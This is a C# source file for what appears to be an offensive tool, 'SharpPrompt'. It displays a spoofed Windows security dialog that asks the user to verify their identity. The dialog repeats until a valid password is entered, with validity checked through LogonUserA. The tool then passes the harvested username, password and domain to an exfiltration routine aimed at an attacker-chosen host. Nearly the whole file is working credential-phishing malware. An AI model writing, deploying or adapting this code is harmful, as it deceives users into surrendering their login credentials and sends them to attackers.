using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace SharpPrompt
{
    internal class Program
    {
        static NetworkCredential promptForCreds(string captionText)
        {
            Api.CREDUI_INFOW credui = new Api.CREDUI_INFOW();

            credui.pszCaptionText = captionText;
            credui.pszMessageText = "For security, an application needs to verify your identity.";
            credui.cbSize = Marshal.SizeOf(credui);

            int errorcode = 0;
            uint dialogReturn;
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            uint outCredSize;
            bool save = false;

            string username = WindowsIdentity.GetCurrent().Name;
            string password = "";
            int inCredSize = 1024;
            IntPtr inCredBuffer = Marshal.AllocCoTaskMem(inCredSize);
            Api.CredPackAuthenticationBuffer(0, username, password, inCredBuffer, ref inCredSize);

            //Show the dialog until cancel is clicked or until valid credentials are entered.
            while (true) {
                dialogReturn = Api.CredUIPromptForWindowsCredentialsW(ref credui, errorcode, ref authPackage, inCredBuffer, (uint)inCredSize,
                out outCredBuffer,
                out outCredSize,
                ref save, 
                Api.PromptForWindowsCredentialsFlags.CREDUIWIN_GENERIC | Api.PromptForWindowsCredentialsFlags.CREDUIWIN_IN_CRED_ONLY);

                if (dialogReturn != 0) break; //Break, if cancel was clicked or an error occurred
                bool incorrectCredentials = false;


                var usernameBuf = new StringBuilder(100);
                var passwordBuf = new StringBuilder(100);
                var domainBuf = new StringBuilder(100);

                int maxUserName = 100;
                int maxDomain = 100;
                int maxPassword = 100;

                if (Api.CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword)) {
                    Api.CoTaskMemFree(outCredBuffer); //clear the memory allocated by CredUIPromptForWindowsCredentials

                    // CredPackAuthenticationBuffer only converts the username and password so we need to extract the domain from the user field
                    var creds = usernameBuf.ToString().Split('\\');
                    NetworkCredential networkCredential = new NetworkCredential
                    {
                        UserName = creds[1],
                        Password = passwordBuf.ToString(),
                        Domain = creds[0]
                    };

                    if (Api.LogonUserA(networkCredential.UserName, networkCredential.Domain, networkCredential.Password, Api.LogonType.LOGON32_LOGON_INTERACTIVE, Api.LogonProvider.LOGON32_PROVIDER_DEFAULT, out IntPtr tokenHandle))
                    {
                        return networkCredential;
                    }
                    incorrectCredentials = true;
                }
                if (incorrectCredentials)
                    errorcode = 1326; // invalid creds error is displayed
            }
            return null;
        }

        static async Task Main(string[] args)
        {
            var parsed = ArgumentParser.Parse(args);
            if (parsed.ParsedOk == false | parsed.Arguments.ContainsKey("/host") == false)
            {
                Info.ShowUsage();
                return;
            }
            string captionText;
            string host;
            bool https = false;
            parsed.Arguments.TryGetValue("/host", out host);
            if (parsed.Arguments.ContainsKey("/https"))
            {
                https = true;
            }
            if (parsed.Arguments.ContainsKey("/text"))
            {
                parsed.Arguments.TryGetValue("/text", out captionText);
                NetworkCredential creds = promptForCreds(captionText);
                if (creds != null)
                {
                    Console.WriteLine(creds.UserName, creds.Password, creds.Domain);
                    Comms x = new Comms { Host = host, HTTPS = https };
                    await x.Exfiltrate(creds);
                    return;
                }
            }
            else
            {
                captionText = @"Making sure it's you";
                NetworkCredential creds = promptForCreds(captionText);
                if (creds != null)
                {
                    Comms x = new Comms{ Host = host, HTTPS = https };
                    await x.Exfiltrate(creds);
                    return;
                }
            }
        }
    }
}
